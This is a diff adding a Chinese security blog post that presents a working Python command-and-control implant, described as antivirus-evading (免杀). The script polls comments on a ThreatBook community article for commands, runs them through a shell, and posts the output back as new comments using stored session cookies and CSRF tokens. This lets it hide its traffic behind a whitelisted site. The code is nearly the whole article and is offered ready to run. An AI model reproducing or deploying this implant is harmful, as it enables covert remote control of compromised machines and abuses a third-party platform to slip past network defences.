@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言看到有师傅发利用某社区的评论实现C2，试验一下。  原理利用某社区天然白名单特性，通过 评论 来实现免杀的远控C2。  main.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970">
+<meta property="og:type" content="article">
+<meta property="og:title" content="微步社区白名单C2">
+<meta property="og:url" content="http://example.com/2023/12/23/2/index.html">
+<meta property="og:site_name" content="mashiro4">
+<meta property="og:description" content="前言看到有师傅发利用某社区的评论实现C2，试验一下。  原理利用某社区天然白名单特性，通过 评论 来实现免杀的远控C2。  main.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/imgs/2/image-20231225103444513.png">
+<meta property="article:published_time" content="2023-12-22T16:17:38.000Z">
+<meta property="article:modified_time" content="2023-12-25T02:35:25.264Z">
+<meta property="article:author" content="mashiro4">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/imgs/2/image-20231225103444513.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>微步社区白名单C2</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/mashiro4">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2023/12/23/1/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/12/23/2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/12/23/2/&text=微步社区白名单C2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/12/23/2/&is_video=false&description=微步社区白名单C2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=微步社区白名单C2&body=Check out this article: http://example.com/2023/12/23/2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/12/23/2/&name=微步社区白名单C2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/12/23/2/&t=微步社区白名单C2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-py"><span class="toc-number">3.</span> <span class="toc-text">main.py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-json"><span class="toc-number">4.</span> <span class="toc-text">data.json</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%95%88%E6%9E%9C"><span class="toc-number">5.</span> <span class="toc-text">实现效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">参考文章：</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        微步社区白名单C2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">mashiro4</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-22T16:17:38.000Z" class="dt-published" itemprop="datePublished">2023-12-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>看到有师傅发利用某社区的评论实现C2，试验一下。</p>
+<hr>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用某社区天然白名单特性，通过 评论 来实现免杀的远控C2。</p>
+<hr>
+<h2 id="main-py"><a href="#main-py" class="headerlink" title="main.py"></a>main.py</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">from subprocess import Popen, PIPE</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">def command(cmd):</span><br><span class="line">    # Popen()函数使用shell执行命令，stdout和stderr是子进程的标准输出和标准错误输出</span><br><span class="line">    process = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)</span><br><span class="line">    # 启动并等待子进程完成，通过stdout和stderr读取子进程的输出</span><br><span class="line">    stdout, stderr = process.communicate()</span><br><span class="line">    # 返回标准输出并解码为gbk编码的字符串</span><br><span class="line">    return stdout.decode(&#x27;gbk&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_comments(short_message_id):</span><br><span class="line">    base_url = &quot;https://x.threatbook.com/v5/node/user/article/queryComments?shortThreatId=&quot;+short_message_id</span><br><span class="line">    try:</span><br><span class="line">     #模拟用户发包</span><br><span class="line">        response = requests.get(base_url)</span><br><span class="line">        # 直接使用 response.json() 获取对象</span><br><span class="line">        json_object = response.json()</span><br><span class="line">        # 定义一个评论列表</span><br><span class="line">        comments_list = json_object[&quot;data&quot;][&quot;list&quot;]</span><br><span class="line">        # 提取第一个 comments 对应的值</span><br><span class="line">        first_comment = comments_list[0][&quot;comments&quot;]</span><br><span class="line">        first_comment1 = first_comment[3:]</span><br><span class="line">        # 返回第一个 comments 对应的值</span><br><span class="line">        return first_comment,first_comment1</span><br><span class="line">        # 错误性判断</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_comment(comment, short_message_id, csrf_token, rememberme, xx_csrf):</span><br><span class="line">    url = &quot;https://x.threatbook.com/v5/node/user/article/saveComment&quot;</span><br><span class="line"> #请求头</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Host&quot;: &quot;x.threatbook.com&quot;,</span><br><span class="line">        &quot;Cookie&quot;: f&quot;csrfToken=&#123;csrf_token&#125;; rememberme=&#123;rememberme&#125;; xx-csrf=&#123;xx_csrf&#125;&quot;,</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">        &quot;X-Csrf-Token&quot;: csrf_token,</span><br><span class="line">        &quot;Xx-Csrf&quot;: xx_csrf,</span><br><span class="line">        &quot;Sec-Ch-Ua-Mobile&quot;: &quot;?0&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&quot;</span><br><span class="line">    &#125;</span><br><span class="line"> #请求体</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;comment&quot;: comment,</span><br><span class="line">        &quot;isAnonymous&quot;: &quot;False&quot;,</span><br><span class="line">        &quot;targetId&quot;: &quot;0&quot;,</span><br><span class="line">        &quot;shortMeaasgeId&quot;: short_message_id</span><br><span class="line">    &#125;</span><br><span class="line"> #回显命令</span><br><span class="line">    try:</span><br><span class="line">        response = requests.post(url, json=data, headers=headers)</span><br><span class="line">        return response.json()</span><br><span class="line">    except requests.exceptions.RequestException as e:</span><br><span class="line">        print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    # 打开 JSON 文件并读取内容</span><br><span class="line">    with open(&#x27;data.json&#x27;, &#x27;r&#x27;) as f:</span><br><span class="line">        json_str = f.read()</span><br><span class="line"></span><br><span class="line">    # 解析 JSON 数据</span><br><span class="line">    data = json.loads(json_str)</span><br><span class="line"></span><br><span class="line">    # 读取各个字段的值</span><br><span class="line">    short_message_id = data[&#x27;short_message_id&#x27;]</span><br><span class="line">    csrfToken = data[&#x27;csrfToken&#x27;]</span><br><span class="line">    rememberme = data[&#x27;rememberme&#x27;]</span><br><span class="line">    xx_csrf = data[&#x27;xx_csrf&#x27;]</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        cmd = get_comments(short_message_id)[0]</span><br><span class="line">        if cmd.startswith(&quot;你好&quot;):</span><br><span class="line">            # 如果以 &quot;你好&quot; 开头，则执行下一步操作</span><br><span class="line">            send_comment(command(get_comments(short_message_id)[1]), short_message_id, csrfToken, rememberme, xx_csrf)</span><br><span class="line">            print(&quot;执行成功&quot;)</span><br><span class="line">        else:</span><br><span class="line">            # 如果不以 &quot;你好&quot; 开头，则执行其他操作</span><br><span class="line">            print(&quot;命令错误&quot;)</span><br><span class="line">        time.sleep(5)  # 延时5秒</span><br></pre></td></tr></table></figure>
+
+<h2 id="data-json"><a href="#data-json" class="headerlink" title="data.json"></a>data.json</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;short_message_id&quot;: &quot;&quot;,</span><br><span class="line">    &quot;csrfToken&quot;: &quot;&quot;,</span><br><span class="line">    &quot;rememberme&quot;: &quot;&quot;,</span><br><span class="line">    &quot;xx_csrf&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h2><p><img src="/imgs/2/image-20231225103444513.png" alt="image-20231225103444513"></p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/46dGdWOoNOVp_XDgYDMzwg">https://mp.weixin.qq.com/s/46dGdWOoNOVp_XDgYDMzwg</a></li>
+</ol>
+<hr>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/mashiro4">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#main-py"><span class="toc-number">3.</span> <span class="toc-text">main.py</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#data-json"><span class="toc-number">4.</span> <span class="toc-text">data.json</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%95%88%E6%9E%9C"><span class="toc-number">5.</span> <span class="toc-text">实现效果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">参考文章：</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/12/23/2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/12/23/2/&text=微步社区白名单C2"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/12/23/2/&is_video=false&description=微步社区白名单C2"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=微步社区白名单C2&body=Check out this article: http://example.com/2023/12/23/2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/12/23/2/&title=微步社区白名单C2"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/12/23/2/&name=微步社区白名单C2&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/12/23/2/&t=微步社区白名单C2"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    mashiro4
+  </div>
+  <div class="footer-right">
+    <nav>
+         <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+
+    </nav>
+  </div>
+</footer>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
